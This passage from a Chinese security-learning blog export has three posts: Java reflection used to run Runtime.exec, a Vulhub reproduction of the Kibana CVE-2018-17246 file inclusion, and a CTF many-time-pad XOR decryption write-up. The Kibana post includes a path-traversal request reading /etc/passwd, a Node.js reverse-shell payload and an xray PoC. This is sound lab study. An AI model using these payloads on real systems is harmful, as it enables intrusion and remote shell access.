<p>一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。</p>
</li>
<li><p>调试器和测试工具</p>
<p>调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。</p>
</li>
</ul>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li><p>性能开辟</p>
<p>反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。</p>
</li>
<li><p>安全限制</p>
<p>使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet。</p>
</li>
<li><p>内部暴露</p>
<p>由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。</p>
</li>
</ul>
<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>我们可以从上面的反射代码中观察到，第一句代码的操作是获取类Class对象，所以这里简单记录下获取Class对象发方法:</p>
<ul>
<li><p>类名.class.</p>
<p>如:com.fanseTest.helloworld.class</p>
</li>
<li><p>Class.formName(“类名”).</p>
<p>如:Class.forName(“com.fanseTest.helloworld”)</p>
</li>
<li><p>对象名.getClass().</p>
<p>如:helloworld test &#x3D; new helloworld();        hello.getClass()</p>
</li>
<li><p>classloader.loadClass(“类名”)如:ClassLoader.getSystemClassLoader().loadClass(“com.fanseTest.helloworld”)</p>
</li>
</ul>
<p>如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String str = <span class="string">&quot;com.fanseTest.helloworld&quot;</span>;</span><br><span class="line">        Class test =  helloworld.class;</span><br><span class="line">        Class test1 = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Class test2 = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        System.out.println(test.toString());</span><br><span class="line">        System.out.println(test1.toString());</span><br><span class="line">        System.out.println(test2.toString());</span><br><span class="line">        helloworld test3 = <span class="keyword">new</span> helloworld();</span><br><span class="line">        System.out.println(test3.getClass().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211204195824874.png" class title="image-20211204195824874">



<p>值的注意的是，当我们获取数组类型的Class对象时，使用java类型描述符(类型描述符相关介绍参见<a href="https://www.haoyun.fit/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/">JAVA类型描述符 | 小透的少年江湖 (haoyun.fit)</a>)</p>
<p>举个栗子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; booleanArray = Class.forname(&quot;[Z&quot;);//获取布尔数组类对象</span><br><span class="line">Class&lt;?&gt; doubleArray = Class.forname(&quot;[D&quot;);//获取浮点数组类对象</span><br><span class="line">Class&lt;?&gt; byteArray = Class.forname(&quot;[B&quot;);//获取字节数组类对象</span><br><span class="line">Class&lt;?&gt; classArray = Class.forname(&quot;[Lclassname;&quot;);</span><br><span class="line">Class&lt;?&gt; cstringArray = Class.forname(&quot;[Ljava.lang.String;&quot;);//获取字符串数组类对象</span><br><span class="line">//[符号根据数组维度来添加</span><br></pre></td></tr></table></figure>

<p>注:</p>
<p>反射 调用内部类的时候需要使用$来代替.，如com.reflect.ReflectTest类中有一个叫做Hello的内部类，调用时将类名写成:com.reflect.ReflectTest$Hello。</p>
<h2 id="RunTime反射"><a href="#RunTime反射" class="headerlink" title="RunTime反射"></a>RunTime反射</h2><p>学习了什么是java反射机制和java反射机制的优缺点，我就有了一个疑问？对于渗透测试代码审计来说，java反射的作用是什么？或者说怎么利用这个机制进行测试。在一些反序列化漏洞执行系统命令时可以调用Runtime等类执行本地命令编写漏洞利用代码、代码审计、绕过RASP方法等，还有后面要学习的内存马等。</p>
<h3 id="本地命令执行"><a href="#本地命令执行" class="headerlink" title="本地命令执行"></a>本地命令执行</h3><p>执行本地命令:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反射Demo1:(注:记得添加org.apache.commons.io程序包)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;    <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">            Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">            String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">            Object runtimeInstance = constructor.newInstance();</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">            Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">            Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211207185314924.png" class title="image-20211207185314924">

<p>返回当前用户为:”desktop-3n366og\administrator”。</p>
<p>反射 Demo2:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">        Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">        Object runtime = runtimeClass1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runtimeClass1);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">        Process process = (Process) runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(runtime,cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">        InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">        System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这两个代码都是反射调用Runtime类的exec()方法执行本地命令执行。但两者不同的是，Demo1获取Runtime类对象是通过构造器创建构造方法来获取，而Demo2是通过Runtime类的getRuntime()方法来获取。</p>
<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><p>反射调用Runtime实现本地命令执行的流程如下:</p>
<ul>
<li>反射获取<code>Runtime</code>类对象(如<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)</li>
<li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)</li>
<li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)</li>
<li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)</li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-Java基础 -java反射 -代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Kibana本地文件包含漏洞(CVE-2018-17246)</title>
    <url>/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/</url>
    <content><![CDATA[<h1 id="Kibana本地文件包含漏洞（CVE-2018-17246）"><a href="#Kibana本地文件包含漏洞（CVE-2018-17246）" class="headerlink" title="Kibana本地文件包含漏洞（CVE-2018-17246）"></a>Kibana本地文件包含漏洞（CVE-2018-17246）</h1><hr>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElasticSearch Kibana &lt; 6.4.3</span><br><span class="line">ElasticSearch Kibana &lt; 5.6.13</span><br></pre></td></tr></table></figure>



<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<p>Fofa:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用Vulhub集成漏洞环境进行搭建，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/kibana/CVE-2018-17246</span><br><span class="line"> </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<p>kibana默认端口为5601,环境搭建成功后访问Kibana默认首页。</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125113942130.png" class title="image-20211125113942130">



<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>这里通过设置apis参数为需要包含的文件，这里设置为&#x2F;etc&#x2F;passwd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>



<p>可以看到服务器响应500</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125134712598.png" class title="image-20211125134712598">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure>

<p>查看kibana的日志，可以看到&#x2F;etc&#x2F;passwd文件已经被包含</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125135321214.png" class title="image-20211125135321214">



<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们写个反弹shell的js语句，将其放到kibana的docker镜像中</p>
<p>js代码如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">12345</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>



<p>将本地创建的文件复制到kibana镜像中的&#x2F;tmp&#x2F;shell.js文件</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 你的文件路径 容器长ID:docker容器路径</span><br></pre></td></tr></table></figure>

<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144232155.png" class title="image-20211125144232155">



<p>进入kibana控制台命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose  exec   kibana  bash</span><br></pre></td></tr></table></figure>

<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125142646488.png" class title="image-20211125142646488">



<p>可以看到复制文件成功</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144306987.png" class title="image-20211125144306987">



<p>在浏览器中访问创建的shell.js文件</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144616545.png" class title="image-20211125144616545">



<p>文件包含成功，js语句执行成功，反弹shell</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144839807.png" class title="image-20211125144839807">



<h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>xray-poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-kibana-cve-2018-17246</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.headers[&quot;kbn-name&quot;] == &quot;kibana&quot; &amp;&amp; response.content_type.contains(&quot;application/json&quot;) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;statusCode\&quot;:500&quot;)) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;message\&quot;:\&quot;An internal server error occurred\&quot;&quot;))</span><br><span class="line">detail:</span><br><span class="line">  author: canc3s(https://github.com/canc3s)</span><br><span class="line">  kibana_version: before 6.4.3 and 5.6.13</span><br><span class="line">  links:</span><br><span class="line">    - https://nvd.nist.gov/vuln/detail/CVE-2018-17246</span><br><span class="line">    - https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_27295403/article/details/100579631">(44条消息) 完美拷贝本地文件到docker容器_大唐锦绣的博客-CSDN博客_拷贝文件到docker容器</a></p>
<p><a href="https://blog.csdn.net/nzjdsds/article/details/119039751">(44条消息) Kibana本地文件包含漏洞（CVE-2018-17246）_大方子-CSDN博客</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Kibana</category>
      </categories>
      <tags>
        <tag>-web应用漏洞 - Kibana -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>MTU攻击</title>
    <url>/2023/12/25/MTU%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="MTU攻击"><a href="#MTU攻击" class="headerlink" title="MTU攻击"></a>MTU攻击</h1><p>以简单异或实现的流密码，如果不能保证一次一密，则是不安全的。本文展示了多次加密采用同一个密钥的情形，此时从密文可能推断出明文和密钥。</p>
<p>在Alice和Bob之间传送消息—— Alice 造一个比较长的密钥，然后用非常秘密的方式告诉 Bob. 接下来，Alice 每次向 Bob 发送信息，都把明文异或上这个约定好的字符串；Bob 收到信息之后，把密文异或上 <code>key</code>, 于是就可以拿到明文。整个过程只需要传送一次密钥，这种方式称为 **Many-Time-Pad (MTP)**。</p>
<p>但上述的MTP方法是不安全，只要截获了足够多的密文，就能推断出明文，进而拿到密钥。这是由于异或运算的性质带来的。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><blockquote>
<p>BUUCTF: [AFCTF2018]你听过一次一密么？</p>
<p>(原题有bug, 笔者有少量改动)<br>25030206463d3d393131555f7f1d061d4052111a19544e2e5d54<br>0f020606150f203f307f5c0a7f24070747130e16545000035d54<br>1203075429152a7020365c167f390f1013170b1006481e13144e<br>0f4610170e1e2235787f7853372c0f065752111b15454e0e0901<br>081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a1855<br>0909075412132e247436425332281a1c561f04071d520f0b1158<br>4116111b101e2170203011113a69001b47520601155205021901<br>041006064612297020375453342c17545a01451811411a470e44<br>021311114a5b0335207f7c167f22001b44520c15544801125d40<br>06140611460c26243c7f5c167f3d015446010053005907145d44<br>0f05110d160f263f3a7f4210372c03111313090415481d49530f</p>
</blockquote>
<p>上面的每个字符串都是明文异或上密钥key得到的密文。<br>$$<br>交换律<br>结合律 (a ⊕ b ) ⊕ c &#x3D; a⊕ ( b ⊕ c)\<br>任何数 x ⊕ x &#x3D; 0 x ⊕ 0 &#x3D; X\<br>自反性 x ⊕ b ⊕ b &#x3D; x ⊕ 0 &#x3D; x<br>$$<br>两个密文的异或就等于两个明文的异或</p>
<img src="/2023/12/25/MTU%E6%94%BB%E5%87%BB/image-20231229094147570.png" class title="image-20231229094147570">

<p><strong>Ascii表</strong></p>
<ul>
<li><code>0x20</code> 是空格。 低于 <code>0x20</code> 的，全部是起特殊用途的字符； <code>0x20~0x7E</code> 的，是可打印字符。</li>
<li><code>0x30~0x39</code> 是数字 <code>0,1,2...9</code>。</li>
<li><code>0x41~0x5A</code> 是大写字母 <code>A-Z</code>； <code>0x61~0x7A</code> 是小写字母 <code>a-z</code></li>
</ul>
<p>得到规律：小写字母异或上空格为对应的大写字母，大写字母异或空格就会得到对应的小写字母</p>
<p>所以，如果 $x \oplus y$ 得到一个英文字母，那么 $x, y$ 中的某一个有很大概率是空格。再来回头看上面 $C_1$ xor 其他密文——也就等于 $M_1$ xor 其他明文的表，如果第 $col$ 列存在大量的英文字母，我们可以猜测 $M_1[col]$ 是一个空格。那一列英文字母越多，把握越大。</p>
<p>　　知道 $M_1$ 的 $col$ 位是空格有什么用呢？别忘了异或运算下，$x$ 的逆元是其自身。所以$$M_i[col] &#x3D; M_1[col] \oplus M_i[col] \oplus  M_1[col]  &#x3D; M_1[col] \oplus M_i[col] \oplus  \text{0x20}$$</p>
<p><strong>攻击</strong></p>
<p>攻击过程显而易见：对于每一条密文$C_i$，拿去异或其他所有密文。然后去数每一列有多少个英文字符，作为“$M_i$在这一位是空格”的评分。依据评分从大到小排序，依次利用 “某个明文的某一位是空格” 这种信息恢复出所有明文的那一列。如果产生冲突，则舍弃掉评分小的。代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isChr</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">index, pos</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSpace</span>():</span></span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.text&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dear Friend, T%is tim&lt; I u</span><br><span class="line">nderstood my m$stake 8nd u</span><br><span class="line">sed One time p,d encr ptio</span><br><span class="line">n scheme, I he,rd tha- it </span><br><span class="line">is the only en.ryptio7 met</span><br><span class="line">hod that is ma9hemati:ally</span><br><span class="line"> proven to be #ot cra:ked </span><br><span class="line">ever if the ke4 is ke)t se</span><br><span class="line">cure, Let Me k#ow if  ou a</span><br><span class="line">gree with me t&quot; use t1is e</span><br><span class="line">ncryption sche e alwa s...</span><br></pre></td></tr></table></figure>

<p>对结果修正一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def know(index, pos, ch):</span><br><span class="line">    msg[index, pos] = ord(ch)</span><br><span class="line">    for x in range(len(c)):</span><br><span class="line">        if x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)</span><br><span class="line"></span><br><span class="line">know(10, 21, &#x27;y&#x27;)</span><br><span class="line">know(8, 14, &#x27;n&#x27;)</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">结果如下：</span><br><span class="line">Dear Friend, This time I u</span><br><span class="line">nderstood my mistake and u</span><br><span class="line">sed One time pad encryptio</span><br><span class="line">n scheme, I heard that it </span><br><span class="line">is the only encryption met</span><br><span class="line">hod that is mathematically</span><br><span class="line"> proven to be not cracked </span><br><span class="line">ever if the key is kept se</span><br><span class="line">cure, Let Me know if you a</span><br><span class="line">gree with me to use this e</span><br><span class="line">ncryption scheme always...</span><br></pre></td></tr></table></figure>

<p>上面的就为明文，将明文和密码作异或就可以得到key值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
